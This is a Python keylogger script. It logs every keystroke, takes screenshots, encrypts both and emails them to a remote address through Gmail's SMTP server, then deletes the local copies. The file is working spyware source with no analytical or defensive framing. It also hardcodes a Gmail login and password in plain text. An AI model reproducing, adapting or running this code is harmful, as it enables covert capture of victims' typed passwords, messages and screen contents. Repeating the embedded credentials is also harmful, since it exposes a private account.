import os
import imghdr
import smtplib
import pyautogui
import urllib.request
import datetime
import pyAesCrypt
from email.message import EmailMessage
from pynput import keyboard

sender_mail = os.environ.get('your_mail')
password = os.environ.get('enc_pass')
bufferSize = 64 * 1024

def connect(host='https://google.com'):
    try:
        urllib.request.urlopen(host) #Python 3.x
        return True
    except:
        return False

def send_pic():
    if connect():
        date_stamp = str(datetime.datetime.now()).split('.')[0]
        date_stamp = date_stamp.replace(" ", "_").replace(":", "_").replace("-", "_")
        file_name = date_stamp + ".png"
        myScreenshot = pyautogui.screenshot()
        myScreenshot.save(file_name)
        pyAesCrypt.encryptFile(file_name, "1.enc_img", password, bufferSize)
    pyAesCrypt.encryptFile("log.txt", "log.enc_log", password, bufferSize)
    #email_address = os.environ.get('usermail')
    #email_pass = os.environ.get('userpass')
    email_address = 'rushabhfight@gmail.com'
    email_pass = 'Movinsir@12345'
    msg = EmailMessage()
    msg['Subject'] = "Keylogger Logged Data"
    msg['From'] = 'rushabhfight@gmail.com'
    msg['To'] = sender_mail
    msg.set_content('To view the attachments \n Download the tool from link below: \n https://drive.google.com/file/d/1u2ZioNC0Ysji7eefK8j4Bpo4XYmAdtj0/view?usp=sharing \n After Downloading the Tool Select the path Where Files are present \n Then Click Decrypt...')

    #image attachments
    with open('1.enc_img','rb') as f:
        file_data = f.read()
        f_name = f.name

    #log attachments
    with open('log.enc_log','rb') as f:
        log_data = f.read()
        log_name = f.name

    msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=f_name)
    msg.add_attachment(log_data, maintype='application', subtype='octet-stream', filename=log_name)

    with smtplib.SMTP_SSL('smtp.gmail.com',465) as smtp:
        smtp.login(email_address,email_pass)
        smtp.send_message(msg)
    os.remove(file_name)
    os.remove('1.enc_img')
    os.remove('log.enc_log')

def log_to_file(text):
    keydata = str(text)
    keydata = keydata.replace("'","")

    if keydata == "Key.space":
        keydata = " "
    if keydata == "Key.shift_r":
        keydata = ""
    if keydata == "Key.shift_l":
        keydata = ""
    if keydata == "Key.enter":
        keydata = "\n"

    with open("log.txt", 'a') as f:
        f.write(keydata)

def on_release(key):
    keydata = str(key)
    if keydata == "Key.space":
        # Stop listener
        send_pic()

# Collect events until released
with keyboard.Listener(
        on_press=log_to_file,
        on_release=on_release) as listener:
    listener.join()
